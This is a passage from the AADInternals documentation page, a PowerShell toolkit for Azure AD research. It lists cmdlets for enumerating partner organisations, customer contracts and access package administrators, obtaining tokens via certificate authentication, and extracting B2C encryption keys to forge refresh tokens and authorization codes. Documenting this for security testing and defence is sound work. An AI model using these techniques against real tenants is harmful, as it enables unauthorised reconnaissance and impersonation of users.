Phone            : +1234567890
Relationship     : Indirect Reseller and Admin
TypeDetail       : PartnerAdmin
CanDelete        : False
CanRemoveDap     : True
AllDataRetrieved : True
</code></pre>

<h3 id="get-aadintmspartnerorganizations-mp">Get-AADIntMSPartnerOrganizations (MP)</h3>

<p>Since version 0.6.5 <br></p>

<p>Lists partner organisations of the logged in user. Does not require permissions to MS Partner Center.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForMSPartner</span> <span class="n">-SaveToCache</span>

<span class="c"># List the partner organisations</span>
<span class="nb">Get-AADIntMSPartnerOrganizations</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>id             : 9a0c7346-f305-4646-b3fb-772853f6b209
typeName       : Tenant
legalEntityCid : bc07db21-7a22-4fc9-9f8a-5df27532f09f
MPNID          : 8559543
companyName    : Partner Ltd
address        : @{country=US; city=PARTNERVILLE; state=AT; addressLine1=666 Partner Park; addressLine2=; postalCode=1234567890}
contact        : @{firstName=Partner; lastName=Manager; email=pmanager@company.com; phoneNumber=+1 234567890}

id             : 60a0020f-bd16-4f27-a23c-104644918834
typeName       : PartnerGlobal
legalEntityCid : bc07db21-7a22-4fc9-9f8a-5df27532f09f
MPNID          : 8559542
companyName    : Partner Ltd
address        : @{country=US; city=PARTNERVILLE; state=AT; addressLine1=666 Partner Park; addressLine2=; postalCode=1234567890}
contact        : @{firstName=Partner; lastName=Manager; email=pmanager@company.com; phoneNumber=+1 234567890}

id             : 297588a4-5c2a-430e-ae1e-b16c5d944a7d
typeName       : PartnerLocation
name           : Partner Ltd, US, PARTNERVILLE
legalEntityCid : bc07db21-7a22-4fc9-9f8a-5df27532f09f
MPNID          : 8559543
companyName    : Partner Ltd
address        : @{country=US; city=PARTNERVILLE; state=AT; addressLine1=666 Partner Park; addressLine2=; postalCode=1234567890}
contact        : @{firstName=Partner; lastName=Manager; email=pmanager@company.com; phoneNumber=+1 234567890}
</code></pre>

<h3 id="get-aadintmspartnerrolemembers-mp">Get-AADIntMSPartnerRoleMembers (MP)</h3>

<p>Since version 0.6.5 <br></p>

<p>Lists MS Partner roles and their members. Does not require permissions to MS Partner Center.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForMSPartner</span> <span class="n">-SaveToCache</span>

<span class="c"># List the partner roles and members</span>
<span class="nb">Get-AADIntMSPartnerRoleMembers</span> 
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Id                                   Name                            Members                                          
--                                   ----                            -------                                          
0e7f236d-a3d8-458a-bd49-eaf200d12cd5 Admin Agent                     {@{displayName=Admin; userPrincipalNa...
082cc3a5-2eff-4274-8fe1-ad5b4387ef55 Helpdesk Agent                  {@{displayName=User; userPrincipalN...                                                 
6b07cbb3-16e4-453a-82f4-7a4310c21bc9 MPN Partner Administrator       @{displayName=User 1; userPrincipalN...
e760e836-1c2d-47d2-9dee-92131ce57878 Report Viewer                                                                    
9ac2b88b-6fad-416c-b849-433f8090de68 Executive Report Viewer         @{displayName=User 2; userPrincipalN...
B53FEC78-7449-4A46-A071-C8BEF4A45134 Account Admin                                                                    
8d3c7e52-447f-4cfd-9b50-1e4dd00495b7 Cosell Solution Admin                                                            
0a28a37c-ec3a-462a-a87b-c409abbdba68 Incentive Administrator                                                          
f712b351-0d8f-4051-a374-0abab5a49b5b Incentive User                                                                   
140c97a7-ab21-4c2f-8f3b-9086898de0d5 Incentive Readonly User                                                          
3d8005f3-1d34-4191-9969-b6da64b83777 Marketing Content Administrator                                                  
4b38bcd9-a505-445b-af32-06c05aaeddd7 Referrals Administrator                                                          
2d9bb971-5414-4bc7-a826-079da1fa0c93 Referrals User   
</code></pre>

<h3 id="get-aadintmspartnercontracts-a">Get-AADIntMSPartnerContracts (A)</h3>

<p>Since version 0.6.5 <br></p>

<p>Lists partner’s customer organisations using provisioning API. Does not require permissions to MS Partner Center or admin rights.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span> 

<span class="c"># List the partner's customer organisations</span>
<span class="nb">Get-AADIntMSPartnerContracts</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>CustomerName     CustomerTenantId                     CustomerDefaultDomain   ContractType           
------------     ----------------                     ---------------------   ------------           
Company          dad33f16-69d1-4e32-880e-9c2d21aa3e59 company.com             SupportPartnerContract 
Contoso          936b7883-4746-4b89-8bc4-c8128795cd7f contoso.onmicrosoft.com ResellerPartnerContract
Adatum           17427dcd-8d61-4c23-9c68-d1f34975b420 adatum.com              SupportPartnerContract 
</code></pre>

<h3 id="find-aadintmspartners">Find-AADIntMSPartners</h3>

<p>Since version 0.6.6 <br></p>

<p>Finds MS Partners using the given criteria.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Find the first 20 partners from Finland</span>
<span class="nb">Find-AADIntMSPartners</span> <span class="n">-Country</span> <span class="n">FI</span> <span class="n">-MaxResults</span> <span class="n">20</span> <span class="p">|</span> <span class="nb">Sort </span><span class="n">CompanyName</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Estimated total matches: 511

TenantId                             CompanyName               Country Address                                       
--------                             -----------               ------- -------                                       
6f28e5b8-67fe-4207-a048-cc17b8e13499 Addend Analytics LLP      FI      @{country=FI; region=Europe; city=Espoo; st...
12f4ed76-f694-4b1e-9b57-c3849eea3f6c CANORAMA OY AB            FI      @{country=FI; region=Europe; city=Kokkola; ...
4521e161-50d6-4596-a921-2783741fda32 Cloud2 Oy                 FI      @{country=FI; region=Europe; city=Helsinki;...
bff3224c-767a-4628-8c53-23a4df13a03c CloudNow IT Oy            FI      @{country=FI; region=Europe; city=Espoo; ad...
719dc930-9d0e-4ea4-b53e-a2c65a625979 Cloudriven Oy             FI      @{country=FI; region=Europe; city=Helsinki;...
6f1ff46b-bd45-422f-ad28-485c03cd59fc Cubiq Analytics Oy        FI      @{country=FI; region=Europe; city=Helsinki;...
6fce4bb8-3501-41c9-afcc-db0fb51c7e3d Digia                     FI      @{country=FI; region=Europe; city=Tampere; ...
b3233d42-4a7e-441a-b94c-8fc0ff30af40 Etteplan MORE Oy          FI      @{country=FI; region=Europe; city=Helsinki;...
87fc9aba-de47-425e-b0ac-712471cbb34f Fujitsu Limited           FI      @{country=FI; region=Europe; city=Helsinki;...
4b4e036d-f94b-4209-8f07-6860b3641366 Gofore Oyj                FI      @{country=FI; region=Europe; city=Helsinki;...
4eee4718-7215-41bf-b130-25ce43c85b33 Henson Group              FI      @{country=FI; region=Europe; city=Tampere; ...
7c0c36f5-af83-4c24-8844-9962e0163719 Hexaware Technologies     FI      @{country=FI; region=Europe; city=Helsinki;...
99ebba89-0dd9-4b7b-8f23-95339d2a81e1 IBM                       FI      @{country=FI; region=Europe; city=Helsinki;...
1c8672ad-d9cc-4f59-b839-90be132d96ab IFI Techsolutions Pvt Ltd FI      @{country=FI; region=Europe; city=Finland; ...
1e3ee4c0-94a9-45a4-9151-07e1858e6372 InlineMarket Oy           FI      @{country=FI; region=Europe; city=Helsinki;...
431fbbea-8544-49f8-9891-e8a4e4756e83 Medha Hosting (OPC) Ltd   FI      @{country=FI; region=Europe; city=Helsinki;...
04207efa-4522-4391-a621-5708a40b634d MPY Yrityspalvelut Oyj    FI      @{country=FI; region=Europe; city=Kuopio; a...
8c467c92-8e59-426e-a612-e23d69cb4437 Myriad Technologies       FI      @{country=FI; region=Europe; city=Helsinki;...
50950a2d-dde4-4887-978d-630468d7f741 Solteq Plc                FI      @{country=FI; region=Europe; city=Jyväskylä...
eab8b88b-cf1a-441a-9ad9-6a8d94dcccbb Solu Digital Oy           FI      @{country=FI; region=Europe; city=ESPOO; ad...
</code></pre>

<h2 id="onenote-functions">OneNote functions</h2>

<h3 id="start-aadintspeech-on">Start-AADIntSpeech (ON)</h3>

<p>Since version 0.6.7 <br></p>

<p>Gets mp3 stream of the given text using learning tools API and plays it with Media player.</p>

<p>The returned url can be used by customers to accept the partner request.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and store to cache</span>
<span class="nb">Get-AADIntAccessTokenForOneNote</span> <span class="n">-SaveToCache</span>

<span class="c"># Play the audio</span>
<span class="nb">Start-AADIntSpeech</span> <span class="n">-Text</span> <span class="s2">"Three Swedish switched witches watch three Swiss Swatch watch switches. Which Swedish switched witch watch which Swiss Swatch watch switch?"</span> <span class="n">-Language</span> <span class="s2">"en-GB"</span> <span class="n">-PreferredVoice</span> <span class="n">Male</span>
</code></pre></div>
<p></p>

<h2 id="certificate-based-authentication-cba">Certificate Based Authentication (CBA)</h2>

<p>Proof-of-concept functions to get access tokens using CBA.</p>

<h3 id="get-aadintadminportalaccesstokenusingcba">Get-AADIntAdminPortalAccessTokenUsingCBA</h3>

<p>Since version 0.6.9 <br></p>

<p>Gets Access Tokens using Certificate Based Authentication (CBA). Returns tokens for Portal and Business Store. Assumes that CN of the given certificate contains upn with domain name.</p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get tokens</span>
<span class="nv">$tokens</span> <span class="p">=</span> <span class="nb">Get-AADIntAdminPortalAccessTokenUsingCBA</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">my_cert</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-PfxPassword</span> <span class="s2">"my supersecret password"</span>
</code></pre></div>


<pre><code>Logged in as user@company.com
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Show the token information</span>
<span class="nb">Read-AADIntAccesstoken</span> <span class="nv">$tokens</span><span class="p">[</span><span class="n">0</span><span class="p">]</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">aud</span><span class="p">,</span><span class="n">iss</span><span class="p">,</span><span class="n">appid</span><span class="p">,</span><span class="n">amr</span> <span class="p">|</span> <span class="nb">fl</span>
</code></pre></div>


<pre><code>aud   : https://portal.office.com/
iss   : https://sts.windows.net/25dc721a-d37f-44ec-b8dc-cc5783e9ec56/
appid : 00000006-0000-0ff1-ce00-000000000000
amr   : {rsa, mfa}
</code></pre>

<h3 id="get-aadintportalaccesstokenusingcba">Get-AADIntPortalAccessTokenUsingCBA</h3>

<p>Since version 0.6.9 <br></p>

<p>Gets Access Tokens using Certificate Based Authentication (CBA).
Returns tokens for Graph, Office search, Substrate, Loki, and Portal
Assumes that CN of the given certificate contains upn with domain name.</p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get tokens</span>
<span class="nv">$tokens</span> <span class="p">=</span> <span class="nb">Get-AADIntPortalAccessTokenUsingCBA</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">my_cert</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-PfxPassword</span> <span class="s2">"my supersecret password"</span>
</code></pre></div>


<pre><code>Logged in as user@company.com
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Show the token information</span>
<span class="nb">Read-AADIntAccesstoken</span> <span class="nv">$tokens</span><span class="p">[</span><span class="n">0</span><span class="p">]</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">aud</span><span class="p">,</span><span class="n">iss</span><span class="p">,</span><span class="n">appid</span><span class="p">,</span><span class="n">amr</span> <span class="p">|</span> <span class="nb">fl</span>
</code></pre></div>


<pre><code>aud   : https://graph.microsoft.com
iss   : https://sts.windows.net/25dc721a-d37f-44ec-b8dc-cc5783e9ec56/
appid : 4765445b-32c6-49b0-83e6-1d93765276ca
amr   : {rsa, mfa}
</code></pre>

<h2 id="access-package-functions">Access Package functions</h2>

<h3 id="get-aadintaccesspackages-ap">Get-AADIntAccessPackages (AP)</h3>

<p>Since version 0.8.2 <br></p>

<p>Returns access packages.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and store to cache</span>
<span class="nb">Get-AADIntAccessTokenForAccessPackages</span> <span class="n">-Tenant</span> <span class="n">company</span><span class="p">.</span><span class="n">com</span> <span class="n">-SaveToCache</span>

<span class="c"># Get Access Packages</span>
<span class="nb">Get-AADIntAccessPackages</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>id                                     : df9513b4-1686-4434-8c37-cbfaeea51b69
catalogId                              : 755780b3-9228-4cf6-8919-732c6f0ff026
displayName                            : Visitors
description                            : Access package for Visitors
isHidden                               : False
isRoleScopesVisible                    : False
createdBy                              : johnd@company.com
createdByString                        : johnd@company.com
createdDateTime                        : 2022-01-02T10:20:44.247Z
modifiedBy                             : johnd@company.com
lastModifiedByString                   : johnd@company.com
modifiedDateTime                       : 2022-01-02T10:20:44.247Z
lastModifiedDateTime                   : 2022-01-02T10:20:44.247Z
lastCriticalModificationDateTime       : 
lastSuccessfulChangeEvaluationDateTime :
</code></pre>

<h3 id="get-aadintaccesspackagecatalogs-ap">Get-AADIntAccessPackageCatalogs (AP)</h3>

<p>Since version 0.8.2 <br></p>

<p>Returns access package catalogs.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and store to cache</span>
<span class="nb">Get-AADIntAccessTokenForAccessPackages</span> <span class="n">-Tenant</span> <span class="n">company</span><span class="p">.</span><span class="n">com</span> <span class="n">-SaveToCache</span>

<span class="c"># Get Access Package Catalogs</span>
<span class="nb">Get-AADIntAccessPackageCatalogs</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>id                   : 755780b3-9228-4cf6-8919-732c6f0ff026
displayName          : Visitors
description          : Catalog for visitors
catalogType          : UserManaged
catalogStatus        : Published
state                : published
isExternallyVisible  : True
createdBy            : johnd@company.com
createdByString      : johnd@company.com
createdDateTime      : 2022-01-02T10:20:44.247Z
modifiedBy           : johnd@company.com
lastModifiedByString : johnd@company.com
modifiedDateTime     : 2022-01-02T10:20:44.247Z
lastModifiedDateTime : 2022-01-02T10:20:44.247Z
</code></pre>

<h3 id="get-aadintaccesspackageadmins-ap">Get-AADIntAccessPackageAdmins (AP)</h3>

<p>Since version 0.8.2 <br></p>

<p>Returns administrators from access package and access package catalog createdBy and modifiedBy fields.</p>

<p>The returned administrators are Global Administrators, User Administrators (until May 5 2023), or Identity Governance Administrators (since May 2023).</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and store to cache</span>
<span class="nb">Get-AADIntAccessTokenForAccessPackages</span> <span class="n">-Tenant</span> <span class="n">company</span><span class="p">.</span><span class="n">com</span> <span class="n">-SaveToCache</span>

<span class="c"># Get Access Package administratrators</span>
<span class="nb">Get-AADIntAccessPackageAdmins</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Acheaduncompany.com
Alexaneoscompany.com
Andownlocompany.com
Anselowslcompany.com
Babergencompany.com
Bethportcompany.com
Brangelocompany.com
Caranteecompany.com
Chmenscompany.com
Conneytrcompany.com
Crofficompany.com
Diumficompany.com
Downtichocompany.com
Getacewedcompany.com
</code></pre>

<h2 id="b2c-functions">B2C functions</h2>

<h3 id="get-aadintb2cencryptionkeys-m">Get-AADIntB2CEncryptionKeys (M)</h3>

<p>Since version 0.9.3 <br></p>

<p>Gets B2C trust framework encryption keys. Can be used to create authorization codes and refresh tokens.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and store to cache</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Get B2C Encryption keys</span>
<span class="nb">Get-AADIntB2CEncryptionKeys</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Container                          Id                                          Key
---------                          --                                          ---
B2C_1A_test                        XZ0q5X-Zu_oY2mX-El89a1YEsh4FRj0e5xpGMjJ94uE System.Security.Cryptography.RSACryptoServiceProvider
B2C_1A_TokenEncryptionKeyContainer My_custom_key_id                            System.Security.Cryptography.RSACryptoServiceProvider
</code></pre>

<h3 id="new-aadintb2crefreshtoken">New-AADIntB2CRefreshToken</h3>

<p>Since version 0.9.3 <br></p>

<p>Creates a new B2C refresh token using the provided public key.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and store to cache</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Get B2C Encryption keys</span>
<span class="nv">$keys</span> <span class="p">=</span> <span class="nb">Get-AADIntB2CEncryptionKeys</span>

<span class="c"># Create the refresh token</span>
<span class="nv">$refresh_token</span> <span class="p">=</span> <span class="nb">New-AADIntB2CRefreshToken</span> <span class="n">-Tenant</span> <span class="s2">"companyb2c"</span> <span class="n">-ClientId</span> <span class="s2">"00364d2a-695e-49e6-b5ef-377276103dc2"</span> <span class="n">-UserId</span> <span class="s2">"910e4c2f-1396-434c-aa8e-1bcf8883376a"</span> <span class="n">-Policy</span> <span class="s2">"B2C_1A_signup_signin"</span> <span class="n">-PublicKey</span> <span class="nv">$keys</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Key</span> <span class="n">-KeyId</span> <span class="nv">$keys</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Id</span>
</code></pre></div>
<p></p>

<h3 id="new-aadintb2cauthorizationcode">New-AADIntB2CAuthorizationCode</h3>

<p>Since version 0.9.3 <br></p>

<p>Creates a new B2C authorization code using the provided public key.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and store to cache</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Get B2C Encryption keys</span>
<span class="nv">$keys</span> <span class="p">=</span> <span class="nb">Get-AADIntB2CEncryptionKeys</span>

<span class="c"># Create the refresh token</span>
<span class="nv">$authorization_code</span> <span class="p">=</span> <span class="nb">New-AADIntB2CAuthorizationCode</span> <span class="n">-Tenant</span> <span class="s2">"companyb2c"</span> <span class="n">-ClientId</span> <span class="s2">"00364d2a-695e-49e6-b5ef-377276103dc2"</span> <span class="n">-UserId</span> <span class="s2">"910e4c2f-1396-434c-aa8e-1bcf8883376a"</span> <span class="n">-Policy</span> <span class="s2">"B2C_1A_signup_signin"</span> <span class="n">-PublicKey</span> <span class="nv">$keys</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Key</span> <span class="n">-KeyId</span> <span class="nv">$keys</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Id</span>
</code></pre></div>
<p></p>
		</div>
		
<div class="post__tags tags clearfix">
	<img class="icon icon-tag" src="/images/tags.png" width="16" height="16" viewbox="0 0 16 16">
	
	<ul class="tags__list">
		<li class="tags__item"><a class="tags__link" href="/tags/office365/" rel="tag">Office365</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/powershell/" rel="tag">PowerShell</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/aadinternals/" rel="tag">AADInternals</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/azuread/" rel="tag">AzureAD</a></li>
	</ul>
</div>

		<div class="post__tags tags clearfix">
<ul class="tags__list">
	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=https%3a%2f%2faadinternals.com%2faadinternals%2f&amp;text=Documentation&amp;tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2faadinternals.com%2faadinternals%2f&amp;mini=true&amp;title=Documentation&amp;summary=AAD%20Internals%20PowerShell%20module&amp;source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
	</article>
	
<div class="authorbox clearfix">
	<figure class="authorbox__avatar">
		<img alt="Dr Nestori Syynimaa (@DrAzureAD) avatar" src="/images/nestori.jpg" class="avatar" height="90" width="90">
	</figure>
	<div class="authorbox__header">
		<span class="authorbox__name">About Dr Nestori Syynimaa (@DrAzureAD)</span>
	</div>
	<div class="authorbox__description">
		Dr Syynimaa works as Principal Identity Security Researcher at Microsoft Security Research. <br> Before his security researcher career, Dr Syynimaa worked as a CIO, consultant, trainer, and university lecturer for over 20 years. He is a regular speaker in scientific and professional conferences related to Microsoft 365 and Entra ID (Azure AD) security. <br><br>Before joining Microsoft, Dr Syynimaa was Microsoft MVP in security category and Microsoft Most Valuable Security Researcher (MVR).
	</div>
</div>
	

	
</main>

	</div>
		<footer class="footer" itemscope="itemscope" itemtype="http://schema.org/WPFooter">
			<div class="container container-inner">
				<p class="footer__copyright"><span><a href="https://creativecommons.org/licenses/by/4.0/" target="_blank"><img src="/images/CC-BY.png"></a> </span></p>
			</div>
		</footer>
	</div>

<script>
	var navigation = responsiveNav(".menu", {
		navClass: "menu--collapse",
	});
</script>


</body></html>